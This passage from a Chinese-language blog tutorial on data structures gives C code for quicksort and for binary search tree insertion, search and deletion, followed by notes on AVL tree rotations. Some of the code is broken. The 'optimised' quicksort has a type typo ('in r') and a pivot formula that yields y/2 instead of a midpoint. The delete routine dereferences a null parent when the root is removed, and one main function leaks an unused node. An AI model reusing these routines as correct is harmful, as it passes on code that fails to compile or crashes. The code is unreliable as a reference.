class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (left &gt; right) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> pivot = data[left], low = left, high = right;<br>    <span class="hljs-keyword">while</span> (low &lt; high) &#123;<br>        <span class="hljs-keyword">while</span> (low &lt; high &amp;&amp; data[high] &gt;= pivot) &#123;<br>            high--;<br>        &#125;<br>        data[low] = data[high];<br>        <span class="hljs-keyword">while</span> (low &lt; high &amp;&amp; data[low] &lt;= pivot) &#123;<br>            low++;<br>        &#125;<br>        data[high] = data[low]; <br>    &#125;<br>    data[low] = pivot;<br>    <br>    quick_sort(data, left, low - <span class="hljs-number">1</span>);<br>    quick_sort(data, low + <span class="hljs-number">1</span>, right);<br>&#125;<br><br><span class="hljs-comment">// quick sort 优化</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">quick_sort_better</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> l, in r)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>        <span class="hljs-keyword">int</span> x = l, y = r, pivot = data[(x + (y - x)) / <span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">while</span> (x &lt;= y) &#123;<br>           <span class="hljs-keyword">while</span> (data[x] &lt; pivot) ++x;<br>            <span class="hljs-keyword">while</span> (data[y] &gt; pivot) --y;<br>            <span class="hljs-keyword">if</span> (x &lt;= y) &#123;<br>                swap(&amp;data[x++], &amp;data[y--]);<br>            &#125;<br>        &#125;<br>    quick_sort_better(data, l, y);<br>        l = x; <span class="hljs-comment">// 直接在当前函数内，快排后半部分</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">int</span> arr[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;arr[i]);<br>    &#125;<br>    quick_sort(arr, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">print</span>(arr, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="二叉查找树">二叉查找树</span></h2><p>对任意结点，如果左子树不为空，则左子树上所有结点的权值都小于该结点的权值；如果右子树不为空，则右子树上所有结点的权值都大于该结点的权值。</p><p>如果中序遍历二叉查找树，会得到一个从小到大的序列。</p><p>在二叉查找树的基础上可以加些优化，可以让其成为 AVL树，红黑树，SBT，Splay等等，这些高级的树结构解决了二叉树退化的问题。</p><blockquote><p>插入过程：</p><ol type="1"><li>根节点为空则新元素直接作为根节点，否则传入的参数 value与根节点进行比较。</li><li>value 等于当前节点则直接返回，小于则跳转到步骤 3，而如果 value大于当前节点时，跳转到步骤 4。</li><li>判断当前节点是否存在左孩子，如果存在则让其左孩子继续调用插入方法，回到步骤2，如果不存在则将新元素插入到当前节点的左孩子位置上。</li><li>判断当前节点是否存在右孩子，存在则让其右子树继续调用插入方法，回到步骤2，不存在则将新元素插入到当前节点的右孩子位置上。</li></ol></blockquote><p>简单实现插入和查找，输出中序遍历结果。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>, *<span class="hljs-title">father</span>;</span><br>&#125;Node;<br><br><span class="hljs-function">Node* <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data, Node *father)</span> </span>&#123;<br>    Node *node = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;data = data;<br>    node-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;father = father;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value, Node *tree)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!tree) &#123;<br>        tree = init(value, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> tree;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value &gt; tree-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (!tree-&gt;rchild)<br>            tree-&gt;rchild = init(value, tree);<br>        <span class="hljs-keyword">else</span><br>            tree-&gt;rchild = insert(value, tree-&gt;rchild);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (!tree-&gt;lchild)<br>            tree-&gt;lchild = init(value, tree);<br>        <span class="hljs-keyword">else</span><br>            tree-&gt;lchild = insert(value, tree-&gt;lchild);<br>    &#125;<br>    <span class="hljs-keyword">return</span> tree;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value, Node *tree)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!tree || value == tree-&gt;data)<br>        <span class="hljs-keyword">return</span> tree; <br>    <span class="hljs-keyword">if</span> (value &gt; tree-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (!tree-&gt;rchild)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> search(value, tree-&gt;rchild);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (!tree-&gt;lchild)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> search(value, tree-&gt;lchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inorder</span><span class="hljs-params">(Node *tree)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!tree) <span class="hljs-keyword">return</span>;<br>    inorder(tree-&gt;lchild);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, tree-&gt;data);<br>    inorder(tree-&gt;rchild);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">clear</span>(node-&gt;lchild);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">clear</span>(node-&gt;rchild);<br>        &#125;<br>        <span class="hljs-built_in">free</span>(node);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *binarytree = <span class="hljs-literal">NULL</span>;<br>    init(<span class="hljs-number">100</span>, binarytree);<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-keyword">int</span> v;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;v);<br>        binarytree = insert(v, binarytree);<br>    &#125;<br>    <span class="hljs-keyword">int</span> value;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;value);<br>    <span class="hljs-keyword">if</span> (search(value, binarytree)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search success!\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search failed!\n"</span>);<br>    &#125;<br><br>    (<span class="hljs-keyword">void</span>)inorder(binarytree);<br><br>    <span class="hljs-built_in">clear</span>(binarytree);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="删除操作">删除操作</span></h3><p>节点的前驱指的是值比它小的节点中最大的一个节点，后继是指值比它大的节点中最小的一个。</p><p>查找节点前驱的算法流程如下：</p><blockquote><ol type="1"><li>找到当前节点的左孩子，如果当前节点没有左孩子则不存在前驱，若存在，则找到其左孩子的右孩子。</li><li>若当前节点有右孩子则继续找到其右孩子，重复步骤2，直至找到一个节点不存在右孩子时，那么它就是要查找的前驱。</li></ol></blockquote><p>删除操作的算法流程如下：</p><blockquote><ol type="1"><li>找到被删除的节点。</li><li>若它存在左孩子，则找到他的前驱，用前驱替换被删除节点的值，再调用删除节点的方法删除前驱。</li><li>若被删除节点不存在左孩子，则找到它的后继，用后继替换被删除节点的值，再调用删除节点的方法删除后继。</li><li>若被删除的节点不存在孩子节点，直接调用删除节点的的方法删除它。</li></ol></blockquote><p>实现删除</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>, *<span class="hljs-title">father</span>;</span><br>&#125;Node;<br><br><span class="hljs-function">Node* <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> _data, Node *_father)</span> </span>&#123;<br>    Node *node =(Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;data = _data;<br>    node-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;father = _father;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">insert</span><span class="hljs-params">(Node *node, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) &#123;<br>        node = init(value, <span class="hljs-literal">NULL</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &gt; node-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild == <span class="hljs-literal">NULL</span>) &#123;<br>            node-&gt;rchild = init(value, node);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            node-&gt;rchild = insert(node-&gt;rchild, value);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; node-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild == <span class="hljs-literal">NULL</span>) &#123;<br>            node-&gt;lchild = init(value, node);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            node-&gt;lchild = insert(node-&gt;lchild, value);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">search</span><span class="hljs-params">(Node *node, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span> || node-&gt;data == value) &#123;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &gt; node-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> search(node-&gt;rchild, value);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> search(node-&gt;lchild, value);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">predecessor</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!node-&gt;lchild) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    Node *res = node-&gt;lchild;<br>    <span class="hljs-keyword">while</span> (res &amp;&amp; res-&gt;rchild) &#123;<br>        res = res-&gt;rchild;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">successor</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!node-&gt;rchild) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    Node *res = node-&gt;rchild;<br>    <span class="hljs-keyword">while</span> (res &amp;&amp; res-&gt;lchild) &#123;<br>        res = res-&gt;lchild;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 删除度为1或者0的节点，在delete_tree函数中使用。</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove_node</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!node) <span class="hljs-keyword">return</span>;<br>    Node *tmp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild) &#123;<br>        tmp = node-&gt;lchild;<br>        tmp-&gt;father = node-&gt;father;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild) &#123;<br>        tmp = node-&gt;rchild;<br>        tmp-&gt;father = node-&gt;father;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (node-&gt;father-&gt;lchild == node) &#123;<br>        node-&gt;father-&gt;lchild = tmp;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        node-&gt;father-&gt;rchild = tmp;<br>    &#125;<br>    node-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;father = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(node);<br>&#125;<br><br><span class="hljs-comment">// 根据输入值删除节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">delete_tree</span><span class="hljs-params">(Node *tree, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!tree) <span class="hljs-keyword">return</span> ERROR;<br>    Node *target = search(tree, value);<br>    <span class="hljs-keyword">if</span> (!target) <span class="hljs-keyword">return</span> ERROR;<br><br>    Node *tmp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (target-&gt;lchild) &#123;<br>        tmp = predecessor(target);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target-&gt;rchild) &#123;<br>        tmp = successor(target);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        tmp = target;<br>    &#125;<br>    target-&gt;data = tmp-&gt;data;<br>    remove_node(tmp);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">clear</span>(node-&gt;lchild);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">clear</span>(node-&gt;rchild);<br>        &#125;<br>        <span class="hljs-built_in">free</span>(node);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *binarytree = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> arr[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span> &#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        binarytree = insert(binarytree, arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">int</span> value;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;value);<br>    <span class="hljs-keyword">if</span> (search(binarytree, value) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search success!\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search failed!\n"</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;value);<br>    <span class="hljs-keyword">if</span> (delete_tree(binarytree, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"delete success!\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"delete failed!\n"</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">clear</span>(binarytree);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="平衡二叉树">平衡二叉树</span></h2><p>所有平衡二叉查找树基本由以下三个特征组成：</p><ol type="1"><li><p>自平衡条件</p></li><li><p>旋转操作</p></li><li><p>旋转的触发</p></li></ol><p>平衡二叉查找树通过设置合理的自平衡条件，使得二叉查找树的查找、插入等操作的性能不至于退化成<span class="math inline">\(O(n)\)</span>.</p><p>AVL 树是最早发明的一种平衡二叉查找树。</p><h3><span id="avl">AVL</span></h3><p>AVL 树提出了一个概念： <strong>平衡因子（balance factor）</strong>。每个结点的平衡因子是指它左子树最大高度和右子树最大高度的差。</p><p>在 AVL 树中，平衡因子为 −1、 0、 1的结点都被认为是平衡的，而平衡因子为 −2、 2等其他值的结点被认为是不平衡的，需要对这个结点所在子树进行调整。</p><h4><span id="旋转">旋转</span></h4><p>在 AVL 树中，一共有两种单旋操作：左旋和右旋。AVL树通过一系列左旋和右旋操作，将不平衡的树调整为平衡二叉查找树。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-16-24-a98b03.png" srcset="/img/loading.gif" lazyload alt="旋转前" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-17-31-c45ecc.png" srcset="/img/loading.gif" lazyload alt="左旋转" style="zoom:50%;"></p><p>通过进行左旋操作，使得原先的根 2 变成了其右孩子 4 的左孩子，而 4原先的左孩子 3 变成了 2 的右孩子。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-19-28-ca48a3.png" srcset="/img/loading.gif" lazyload alt="旋转前" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-20-25-2bf095.png" srcset="/img/loading.gif" lazyload alt="右旋转" style="zoom:50%;"></p><p>通过右旋操作，使得原先的根 5 变成了其左孩子 3 的右孩子，而 3原先的右孩子变成了 5 的左孩子。</p><p>AVL树中还有两种复合旋转操作（即“多旋”），由两次单旋操作组合而成。</p><p>左旋加右旋：</p><p><img src="C:/Users/qw/Desktop/数据结构/images/Notes2_pic/image-20211005112345360.png" srcset="/img/loading.gif" lazyload alt="image-20211005112345360" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-24-42-0fd681.png" srcset="/img/loading.gif" lazyload style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-25-17-5b491f.png" srcset="/img/loading.gif" lazyload style="zoom:50%;"></p><p>右旋加左旋：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-25-56-87fbaf.png" srcset="/img/loading.gif" lazyload style="zoom:50%;"></p><p><img 